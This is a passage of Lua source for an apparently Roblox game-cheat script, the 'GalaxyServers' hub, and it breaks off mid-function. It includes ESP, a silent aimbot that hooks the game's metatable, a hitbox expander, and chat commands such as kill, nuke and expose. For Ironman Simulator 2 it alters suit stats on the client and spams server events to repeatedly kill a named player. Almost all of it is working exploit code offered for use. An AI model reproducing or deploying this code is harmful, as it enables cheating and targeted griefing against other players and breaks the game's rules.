    ESP.Players = true
    ESP.Boxes = false
    ESP.Tracers = false
    ESP.Names = false
    ESP:Toggle(true)

    ESP:AddObjectListener(Workspace, {
        Name = "",
        CustomName = "",
        Color = Color3.fromRGB(0, 0, 0),
        IsEnabled = "whatever"
    })
    ESP.whatever = true

    local Toggle = esp:AddToggle("Name ESP", {flag = "Toggle_Flag", default = false}, function(asdw)
        pcall(function()
            if asdw == true then
                ESP.Names = true
            else
                ESP.Names = false
            end
        end)
    end)

    local Toggle = esp:AddToggle("Boxes", {flag = "Toggle_Flag", default = false}, function(asdw)
        pcall(function()
            if asdw == true then
                ESP.Boxes = true
            else
                ESP.Boxes = false
            end
        end)
    end)

    local Toggle = esp:AddToggle("Tracers", {flag = "Toggle_Flag", default = false}, function(asdw)
        pcall(function()
            if asdw == true then
                ESP.Tracers = true
            else
                ESP.Tracers = false
            end
        end)
    end)

    local Picker = esp:AddPicker("Color", {color = Color3.fromRGB(255, 0, 0)}, function(color)
        ESP.Color = color
    end)

    local Settings = {
        Silent = false,
        FovUsed = false,
        Fov = 100,
    }

    local RunService = game:GetService("RunService")
    local UserInputService = game:GetService("UserInputService")
    local Camera = game:GetService("Workspace").CurrentCamera
    local Players = game:GetService("Players")
    local Player = Players.LocalPlayer
    local Mouse = Player:GetMouse()
    local Metatable = getrawmetatable(game)
    local Index = Metatable.__index
    local Target = nil

    local Circle = Drawing.new("Circle")
    Circle.Color = Color3.new(255,105,180)
    Circle.Thickness = 1
    Circle.Radius = Settings.Fov
    Circle.Visible = Settings.FovUsed
    Circle.NumSides = 15
    Circle.Filled = false
    Circle.Transparency = 1

    function GetOffset(part, pos)
        local FarPosition = Camera:WorldToViewportPoint(Vector3.new(part.Position.X, part.Position.Y + (part.Size.Y / 2), part.Position.Z))
        
        return FarPosition.Y - pos.Y
    end

    function GetClosest() 
        local Closest = nil;
        local Magnitude = math.huge

        for i, v in next, Players:GetPlayers() do 
            if v ~= Player and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then 
                local Position, Visible = Camera:WorldToScreenPoint(v.Character["HumanoidRootPart"].Position) 

                if Visible then
                    local Mouse = Player:GetMouse()
                    local Distance = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(Position.X, Position.Y)).Magnitude 

                    if not Settings.FovUsed and Distance < Magnitude or Settings.FovUsed and Distance < Magnitude and Distance < Settings.Fov then 
                        Closest = v 
                        Magnitude = Distance
                    end
                end
            end
        end

        return Closest 
    end

    setreadonly(Metatable, false)
    Metatable.__index = newcclosure(function(self, Property)
        if Settings.Silent and self == Mouse and Property == "Hit" and Target ~= nil then
            
            return CFrame.new(Target.Character.UpperTorso.Position)
        end
        
        return Index(self, Property)
    end)
    setreadonly(Metatable, true)

    RunService.RenderStepped:Connect(function()
        local Mouse = UserInputService:GetMouseLocation()

        Circle.Position = Vector2.new(Mouse.X, Mouse.Y)
        Target = GetClosest()
    end)

    local Toggle = aimbot:AddToggle("Silent Aim", {flag = "Toggle_Flag", default = false}, function(s)
        Settings.Silent = s
    end)

    local Toggle = aimbot:AddToggle("FOV Circle", {flag = "Toggle_Flag", default = false}, function(s)
        Settings.FovUsed = s
        Circle.Visible = s
    end)

    local Slider = aimbot:AddSlider("FOV Size", 1, 300, 100, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(s)
        Settings.Fov = s
        Circle.Radius = s
    end)

    local Slider = aimbot:AddSlider("FOV Circle Sides", 1, 100, 100, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(s)
        Circle.NumSides = s
    end)

    local Slider = aimbot:AddSlider("FOV Transparency", 0.1, 1, 1, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(s)
        Circle.Transparency = s
    end)

    local Slider = aimbot:AddSlider("FOV Thickness", 1, 85, 1, {toggleable = FALSE, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = false}, function(s)
        Circle.Thickness = s
    end)

    local Toggle = aimbot:AddToggle("Fill FOV Circle", {flag = "Toggle_Flag", default = false}, function(s)
        Circle.Filled = s
    end)

    local Picker = aimbot:AddPicker("Color", {color = Color3.fromRGB(255,105,180)}, function(color)
        Circle.Color = color
    end)

    local size3 = 10
    local value = false
    local Toggle = hit:AddToggle("HitBox Visibility", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function(s)
                if not value then
                    for i,v in pairs(game.Players:GetChildren()) do
                        if v.Name ~= game.Players.LocalPlayer.Name then
                            v.Character.HumanoidRootPart.Size = Vector3.new(2, 2, 1)
                            v.Character.HumanoidRootPart.Transparency = 1
                        end
                    end
                    return d:Disconnect()
                end
                if s then
                    for i,v in pairs(game.Players:GetChildren()) do
                        if v.Name ~= game.Players.LocalPlayer.Name then
                            v.Character.HumanoidRootPart.Size = Vector3.new(size3, size3, size3)
                            v.Character.HumanoidRootPart.Transparency = 0.5
                            v.Character.HumanoidRootPart.CanCollide = false
                            v.Character.HumanoidRootPart.Material = "SmoothPlastic"
                        end
                    end
                end
            end)
        end
    end)

    local Slider = hit:AddSlider("HitBox Size", 5, 100, 10, {toggleable = false, default = false, flag = "hitslider", fireontoggle = true, fireondrag = true, rounded = true}, function(val, bool)
        size3 = val
    end)

    local Label = chat:AddLabel("<> snap <name>")
    local Label = chat:AddLabel("<> confuse <name>")
    local Label = chat:AddLabel("<> god <name>")
    local Label = chat:AddLabel("<> fling <name>")
    local Label = chat:AddLabel("<> rocket <name>")
    local Label = chat:AddLabel("<> loopkill <name>")
    local Label = chat:AddLabel("<> loopconfuse <name>")
    local Label = chat:AddLabel("<> loopgod <name>")
    local Label = chat:AddLabel("<> loopfling <name>")

    local Label = buyer:AddLabel("<> shutdown <name>")
    local Label = buyer:AddLabel("<> ghcheck")
    local Label = buyer:AddLabel("<> hack <name>")
    local Label = buyer:AddLabel("<> hell <name>")
    local Label = buyer:AddLabel("<> kill <name>")
    local Label = buyer:AddLabel("<> bring <name>")
    local Label = buyer:AddLabel("<> freeze <name>")
    local Label = buyer:AddLabel("<> rejoin <name>")
    local Label = buyer:AddLabel("<> crip <name>")
    local Label = buyer:AddLabel("<> nuke <name>")
    local Label = buyer:AddLabel("<> snek <name>")
    local Label = buyer:AddLabel("<> scp <name>")
    local Label = buyer:AddLabel("<> expose <name>")


    local Picker = gui:AddPicker("UI Theme Colour", {color = Color3.fromRGB(255, 0, 255)}, function(color)
        Window:SetAccent(color)
    end)

    local Label = gui:AddLabel("LeftControl to minimize UI")

    local ClipboardLabel = gui:AddClipboardLabel("Copy Discord Server link", function()
        return "https://discord.gg/vCmtKwSE7w"
    end)
end

function IronManSimulator2()
    -- Create Window
    local Window = Library:AddWindow({
        title = {"GalaxyServers", "Ironman Simulator 2"},
        theme = {
            Accent = Color3.fromRGB(255, 0, 255)
        },
        key = Enum.KeyCode.LeftControl,
        default = true
    })

    -- Create Tab
    local ff = Window:AddTab("Suit", {default = true})
    local main = ff:AddSection("Main", {default = true})
    local stats = ff:AddSection("Change Suit Stats", {default = true})

    local combat = Window:AddTab("Combat", {default = false})
    local textboxes = combat:AddSection("TextBoxes", {default = true})
    local pee = combat:AddSection("Main", {default = true})
    local click = combat:AddSection("Clicks", {default = false})
    local aura = combat:AddSection("Auras", {default = true})
    local plr = combat:AddSection("Local Player", {default = true})

    local uni = Window:AddTab("Universal", {default = false})
    local esp = uni:AddSection("ESP", {default = true})
    local hit = uni:AddSection("Hitbox Expander", {default = true})
    local invis = uni:AddSection("Invisible", {default = true})
    local chat = uni:AddSection("Chat Commands", {default = true})
    local buyer = uni:AddSection("Buyer Chat Commands", {default = true})

    local misc = Window:AddTab("Misc", {default = false})
    local gui = misc:AddSection("UI Functions", {default = true})

    function safezone()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3795, 16563, -290)
    end

    function chromeList(list)
        table.foreach(list,function(a,v)
            if v then
                local Option = v
                Option = string.gsub(Option,' ','')
                local lp = game.Players.LocalPlayer
                local lpb = lp.Backpack
                local lpc = lp.Character
                if lpc:FindFirstChild'Suit' then
                    for _,v in pairs(lpc.Suit:GetChildren()) do
                        if v.Name == Option then
                            local ms = v:GetChildren()
                            for _,v in pairs(ms) do
                                if v.Name == 'Union' then
                                    v:Destroy()
                                elseif v.Name == 'Part' then
                                    if v.Parent ~= lpc.Suit.UpperTorso then
                                        v:Destroy()
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end)
    end

    local Box = main:AddBox("Call Suit", {fireonempty = true}, function(v)
        if v:gsub(' ','') == '' then 
            return 
        end
        v = v:lower():gsub(' ','')
        v = v:gsub('mark ','')
        game:GetService("ReplicatedStorage").Events.RequestSuit:InvokeServer(shared.suit)
        if tonumber(v:match('%d+')) ~= nil then
            local g = tonumber(v:match('%d+'))
            if g ~= nil and g >= 2 and g <= 42 then
                shared.suit = 'Mark '..g
            end
        end
    end)

    local Button = main:AddButton("Chrome All", function()
        chromeList({
            'Upper Torso',
            'Lower Torso',
            'Left Upper Arm',
            'Right Upper Arm',
            'Left Lower Arm',
            'Right Lower Arm',
            'Left Hand',
            'Right Hand',
            'Left Upper Leg',
            'Right Upper Leg',
            'Left Lower Leg',
            'Right Lower Leg',
            'Left Foot',
            'Right Foot',
        })
    end)

    local Toggle = main:AddToggle("Auto Chrome Suit", {flag = "Toggle_Flag", default = false}, function(s)
        autoc = s
        if autoc then
            local d
            d = game:GetService('RunService').Stepped:connect(function()
                if not autoc then
                    d:Disconnect()
                end
                chromeList({
                    'Upper Torso',
                    'Lower Torso',
                    'Left Upper Arm',
                    'Right Upper Arm',
                    'Left Lower Arm',
                    'Right Lower Arm',
                    'Left Hand',
                    'Right Hand',
                    'Left Upper Leg',
                    'Right Upper Leg',
                    'Left Lower Leg',
                    'Right Lower Leg',
                    'Left Foot',
                    'Right Foot',
                })
            end)
        end 
    end)

    local value = false
    local Toggle = main:AddToggle("Auto Call Suit", {flag = "Toggle_Flag", default = false}, function(s)
        value = s
        if s then
            local d
            d = game:service('RunService').Stepped:connect(function()
                if not value then
                    return d:Disconnect()
                end
                if game.Players.LocalPlayer.Character:FindFirstChild("Suit") then
                    return
                else
                    game:GetService("ReplicatedStorage").Events.RequestSuit:InvokeServer(shared.suit)
                end
            end)
        end
    end)

    local helm_toggle = true
    local Button = main:AddButton("Toggle Helmet", function()
        pcall(function()

            if helm_toggle == true then
                helm_toggle = false
                local Event = game:GetService("ReplicatedStorage").Events.CallPiece
                Event:FireServer(game:GetService("Players").LocalPlayer.Character.Suit.Mask)
                Event:FireServer(game:GetService("Players").LocalPlayer.Character.Suit.Helmet)

                game.Players.LocalPlayer.Character.Suit.Helmet.Helmet.CanCollide = true
                game.Players.LocalPlayer.Character.Suit.Mask.Main.CanCollide = true
            elseif helm_toggle == false then
                local Event = game:GetService("ReplicatedStorage").Events.WeldPiece
                spawn(function()
                    Event:FireServer(game:GetService("Workspace")[game.Players.LocalPlayer.Name].Suit.Mask.Main, game:GetService("Workspace")[game.Players.LocalPlayer.Name].Head)
                end)

                spawn(function()
                    Event:FireServer(game:GetService("Workspace")[game.Players.LocalPlayer.Name].Suit.Helmet.HelmetMain, game:GetService("Workspace")[game.Players.LocalPlayer.Name].Head)
                end)
                helm_toggle = true
            end

        end)
    end)

    local Dropdown = main:AddDropdown("Modified Suits", {"Invis Mark 33", "Mark 33", "Mark 42", "Mark 43"}, {default = "None"}, function(asda)
        pcall(function()

            if asda == "Invis Mark 33" then
                require(game.ReplicatedStorage.Modules.SuitData)['Mark 33'].FlightSpeed = 700
                require(game.ReplicatedStorage.Modules.SuitData)['Mark 33'].MaxHeight = math.huge
                require(game.ReplicatedStorage.Modules.SuitData)['Mark 33'].Technology = "Nano"
                require(game.ReplicatedStorage.Modules.SuitData)['Mark 33'].HUDColor = Color3.fromRGB(134, 50, 237)
                game:GetService("ReplicatedStorage").Events.RequestSuit:InvokeServer("Mark 33")
                wait(7)
                game.Players.LocalPlayer:FindFirstChild("PlayerGui").JARVIS_HUD.suitName.Text = "GalaxyServers | Invisible Mark 33"
            end

            if asda == "Mark 33" then
                require(game.ReplicatedStorage.Modules.SuitData)['Mark 33'].FlightSpeed = 700
                require(game.ReplicatedStorage.Modules.SuitData)['Mark 33'].MaxHeight = math.huge
                require(game.ReplicatedStorage.Modules.SuitData)['Mark 33'].Technology = "Prehensile"
                require(game.ReplicatedStorage.Modules.SuitData)['Mark 33'].HUDColor = Color3.fromRGB(134, 50, 237)
                game:GetService("ReplicatedStorage").Events.RequestSuit:InvokeServer("Mark 33")
                wait(7)
                game.Players.LocalPlayer:FindFirstChild("PlayerGui").JARVIS_HUD.suitName.Text = "GalaxyServers | Mark 33"
            end

            if asda == "Mark 42" then
                require(game.ReplicatedStorage.Modules.SuitData)['Mark 42'].FlightSpeed = 700
                require(game.ReplicatedStorage.Modules.SuitData)['Mark 42'].MaxHeight = math.huge
                require(game.ReplicatedStorage.Modules.SuitData)['Mark 42'].HUDColor = Color3.fromRGB(134, 50, 237)
                game:GetService("ReplicatedStorage").Events.RequestSuit:InvokeServer("Mark 42")
                wait(7)
                game.Players.LocalPlayer:FindFirstChild("PlayerGui").JARVIS_HUD.suitName.Text = "GalaxyServers | Mark 42"
            end

            if asda == "Mark 43" then
                require(game.ReplicatedStorage.Modules.SuitData)['Mark 43'].FlightSpeed = 700
                require(game.ReplicatedStorage.Modules.SuitData)['Mark 43'].MaxHeight = math.huge
                require(game.ReplicatedStorage.Modules.SuitData)['Mark 43'].HUDColor = Color3.fromRGB(134, 50, 237)
                game:GetService("ReplicatedStorage").Events.RequestSuit:InvokeServer("Mark 43")
                wait(7)
                game.Players.LocalPlayer:FindFirstChild("PlayerGui").JARVIS_HUD.suitName.Text = "GalaxyServers | Mark 43"
            end

        end)
    end)

    local Dropdown = main:AddDropdown("Kill Parts", {"Select All", "UpperTorso", "LowerTorso", "LeftUpperArm", "LeftLowerArm", "LeftHand", "RightUpperArm", "RightLowerArm", "RightHand", "LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "RightUpperLeg", "RightLowerLeg", "RightFoot"}, {default = "None"}, function(asda)
        pcall(function()

            if asda == "Select All" then
                for i,v in pairs(game.Players.LocalPlayer.Character.Suit:GetDescendants()) do
                    if v.Name == "Union" then
                        v.CanCollide = true
                    end
                end
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.Helmet
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.Mask
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.UpperTorso
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.LowerTorso
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.LeftUpperArm
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.LeftLowerArm
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.LeftHand
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.RightUpperArm
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.RightLowerArm
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.LeftUpperLeg
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.LeftLowerLeg
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.LeftFoot
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.RightUpperLeg
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.RightLowerLeg
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))

                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.RightFoot
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

            if asda == "UpperTorso" then
                game.Players.LocalPlayer.Character.Suit.UpperTorso.Union.CanCollide = true
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.UpperTorso
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

            if asda == "LowerTorso" then
                game.Players.LocalPlayer.Character.Suit.LowerTorso.Union.CanCollide = true
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.LowerTorso
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

            if asda == "LeftUpperArm" then
                game.Players.LocalPlayer.Character.Suit.LeftUpperArm.Union.CanCollide = true
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.LeftUpperArm
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

            if asda == "LeftLowerArm" then
                game.Players.LocalPlayer.Character.Suit.LeftLowerArm.Union.CanCollide = true
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.LeftLowerArm
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

            if asda == "LeftHand" then
                game.Players.LocalPlayer.Character.Suit.LeftHand.Union.CanCollide = true
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.LeftHand
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

            if asda == "RightUpperArm" then
                game.Players.LocalPlayer.Character.Suit.RightUpperArm.Union.CanCollide = true
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.RightUpperArm
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

            if asda == "RightLowerArm" then
                game.Players.LocalPlayer.Character.Suit.RightLowerArm.Union.CanCollide = true
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.RightLowerArm
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

            if asda == "RightHand" then
                game.Players.LocalPlayer.Character.Suit.RightHand.Union.CanCollide = true
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

            if asda == "LeftUpperLeg" then
                game.Players.LocalPlayer.Character.Suit.LeftUpperArm.Union.CanCollide = true
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.LeftUpperLeg
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

            if asda == "LeftLowerLeg" then
                game.Players.LocalPlayer.Character.Suit.LeftLowerLeg.Union.CanCollide = true
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.LeftLowerLeg
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

            if asda == "LeftFoot" then
                game.Players.LocalPlayer.Character.Suit.LeftFoot.Union.CanCollide = true
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.LeftFoot
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

            if asda == "RightUpperLeg" then
                game.Players.LocalPlayer.Character.Suit.RightUpperLeg.Union.CanCollide = true
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.RightUpperLeg
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

            if asda == "RightLowerLeg" then
                game.Players.LocalPlayer.Character.Suit.RightLowerLeg.Union.CanCollide = true
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.RightLowerLeg
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

            if asda == "RightFoot" then
                game.Players.LocalPlayer.Character.Suit.RightFoot.Union.CanCollide = true
                local args = {
                    [1] = game:GetService("Players").LocalPlayer.Character.Suit.RightFoot
                }

                game:GetService("ReplicatedStorage").Events.CallPiece:FireServer(unpack(args))
            end

        end)
    end)

    local SuperFire = false
    local Stealth = false
    local Dropdown = main:AddDropdown("Flight Mode", {"Normal", "Super Fire", "Stealth"}, {default = "None"}, function(asda)
        pcall(function()

            if asda == "Normal" then
                SuperFire = false
                Stealth = false
            end

            if asda == "Super Fire" then
                SuperFire = true
                Stealth = false
                while SuperFire do
                    wait()
                    pcall(function()
                        if game.Players.LocalPlayer.Character.HumanoidRootPart.flightStart then
                            for a=1,15 do
                                local args = {
                                    [1] = true
                                }
                                
                                game:GetService("ReplicatedStorage").Events.ToggleFlight:FireServer(unpack(args))
                            end
                            wait(9)
                        end
                    end)
                end
            end

            if asda == "Stealth" then
                Stealth = true
                SuperFire = false
                while Stealth do
                    wait()
                    pcall(function()
                        if game.Players.LocalPlayer.Character.HumanoidRootPart.flightStart then
                            for a=1,15 do
                                local args = {
                                    [1] = false
                                }
                                
                                game:GetService("ReplicatedStorage").Events.ToggleFlight:FireServer(unpack(args))
                            end
                            wait(9)
                        end
                    end)
                end          
            end

        end)
    end)

    local Box = stats:AddBox("Model", {fireonempty = true}, function(asdw)
        pcall(function()
            if asdw == "" then
                for i = 2,40 do
                    pcall(function()
                        require(game.ReplicatedStorage.Modules.SuitData)['Mark '..i].Model = "Mark 33"
                    end)
                end
            else
                for i = 2,40 do
                    pcall(function()
                        require(game.ReplicatedStorage.Modules.SuitData)['Mark '..i].Model = asdw
                    end)
                end
            end
        end)
    end)

    local Box = stats:AddBox("Technology", {fireonempty = true}, function(asdw)
        pcall(function()
            if asdw == "" then
                for i = 2,40 do
                    pcall(function()
                        require(game.ReplicatedStorage.Modules.SuitData)['Mark '..i].Technology = "Prehensile"
                    end)
                end
            else
                for i = 2,40 do
                    pcall(function()
                        require(game.ReplicatedStorage.Modules.SuitData)['Mark '..i].Technology = asdw
                    end)
                end
            end
        end)
    end)

    local Slider = stats:AddSlider("Flight Speed", 0, 3500, 150, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(value)
        for i = 2,40 do
            pcall(function()
                require(game.ReplicatedStorage.Modules.SuitData)['Mark '..i].FlightSpeed = value
            end)
        end
    end)

    local Slider = stats:AddSlider("Max Flight Height", 0, 5000, 450, {toggleable = false, default = false, flag = "Slider_Flag", fireontoggle = true, fireondrag = true, rounded = true}, function(value)
        for i = 2,40 do
            pcall(function()
                require(game.ReplicatedStorage.Modules.SuitData)['Mark '..i].MaxHeight = value
            end)
        end
    end)

    local Toggle3 = stats:AddToggle("Infinite Flight Height", {flag = "fheight", default = false}, function(s)
    pcall(function()
        if s == true then
            for i = 2,40 do
                pcall(function()
                    require(game.ReplicatedStorage.Modules.SuitData)['Mark '..i].MaxHeight = math.huge
                end)
            end
        else
            for i = 2,40 do
                pcall(function()
                    require(game.ReplicatedStorage.Modules.SuitData)['Mark '..i].MaxHeight = 2200
                end)
            end
        end
    end)
    end)

    local Toggle3 = stats:AddToggle("Infinite Energy Efficiency", {flag = "fheight", default = false}, function(s)
        pcall(function()
            if s == true then
                for i = 2,40 do
                    pcall(function()
                        require(game.ReplicatedStorage.Modules.SuitData)['Mark '..i].Efficiency = math.huge
                    end)
                end
            else
                for i = 2,40 do
                    pcall(function()
                        require(game.ReplicatedStorage.Modules.SuitData)['Mark '..i].Efficiency = 100
                    end)
                end
            end
        end)
    end)

    local Button = stats:AddButton("Apply", function()
        pcall(function()
            game:GetService("ReplicatedStorage").Events.DestroySuit:FireServer()
        end)
    end)

    local boxtarget = nil
    local Repulsors = false
    local Rockets = false

    local value = false
    local Toggle = textboxes:AddToggle("Loopkill", {flag = "lkill", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Stepped:connect(function()
                if not value then
                    return g:Disconnect()
                end
                if game.Players[boxtarget].Character.Humanoid.Health == 0 then
                    return
                end
                if Repulsors == true then
                    local args = {
                        [1] = {
                            ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                        }
                    }
                    game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                    
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.repulsorBeam,
                            ["hitPart"] = game.Players[boxtarget].Character.HumanoidRootPart,
                            ["hitPos"] = game.Players[boxtarget].Character.HumanoidRootPart.Position,
                            ["hitNormal"] = game.Players[boxtarget].Character.HumanoidRootPart.Position
                        }
                    }
                    game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                    local args = {
                        [1] = {
                            ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                        }
                    }
                    game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
        
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.repulsorBeam,
                            ["hitPart"] = game.Players[boxtarget].Character.HumanoidRootPart,
                            ["hitPos"] = game.Players[boxtarget].Character.HumanoidRootPart.Position,
                            ["hitNormal"] = game.Players[boxtarget].Character.HumanoidRootPart.Position
                        }
                    }
                    game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                    local args = {
                        [1] = {
                            ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                        }
                    }
                    game:GetService("ReplicatedStorage").Events.FireRepulsor:InvokeServer(unpack(args))
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.repulsorBeam,
                            ["hitPart"] = game.Players[boxtarget].Character.HumanoidRootPart,
                            ["hitPos"] = game.Players[boxtarget].Character.HumanoidRootPart.Position,
                            ["hitNormal"] = game.Players[boxtarget].Character.HumanoidRootPart.Position
                        }
                    }
                    game:GetService("ReplicatedStorage").Events.RepulsorHit:FireServer(unpack(args))
                end
                if Rockets == true then
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.explosion,
                            ["hitPos"] = game.Players[boxtarget].Character.UpperTorso.Position,
                        }
                    }
                    
                    game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.explosion,
                            ["hitPos"] = game.Players[boxtarget].Character.UpperTorso.Position,
                        }
                    }
                    
                    game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.explosion,
                            ["hitPos"] = game.Players[boxtarget].Character.UpperTorso.Position,
                        }
                    }
                    
                    game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.explosion,
                            ["hitPos"] = game.Players[boxtarget].Character.UpperTorso.Position,
                        }
                    }
                    
                    game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                end
            end)
        end
    end)

    local value = false
    local Toggle = textboxes:AddToggle("Loopdisable Flight", {flag = "lkill", default = false}, function(s)
        value = s
        if s then
            local g
            g = game:service('RunService').Heartbeat:connect(function()
                if not value then
                    return g:Disconnect()
                end
                if game.Players[boxtarget].Character.Humanoid.Health == 0 then
                    return
                end
                if game.Players[boxtarget].Character.HumanoidRootPart.flightStart then
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.explosion,
                            ["hitPos"] = game.Players[boxtarget].Character.UpperTorso.Position,
                        }
                    }
                    
                    game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.explosion,
                            ["hitPos"] = game.Players[boxtarget].Character.UpperTorso.Position,
                        }
                    }
                    
                    game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.explosion,
                            ["hitPos"] = game.Players[boxtarget].Character.UpperTorso.Position,
                        }
                    }
                    
                    game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                    local args = {
                        [1] = {
                            ["projectile"] = workspace.Effects.explosion,
                            ["hitPos"] = game.Players[boxtarget].Character.UpperTorso.Position,
                        }
                    }
                    
                    game:GetService("ReplicatedStorage").Events.RocketHit:FireServer(unpack(args))
                end
            end)
        end
    end)

    local Box = textboxes:AddBox("Select a Player", {fireonempty = true}, function(asdw)
        pcall(function()
            if asdw == "" then
                boxtarget = nil
            else
                boxtarget = asdw
            end
        end)
    end)

    local Button = textboxes:AddButton("Kill Player", function()
        local g
        g = game:service('RunService').Stepped:connect(function()
            if game.Players[boxtarget].Character.Humanoid.Health == 0 then
                return g:Disconnect()
            end
            if Repulsors == true then
                local args = {
                    [1] = {
                        ["hand"] = game:GetService("Players").LocalPlayer.Character.Suit.RightHand
                    }
                }
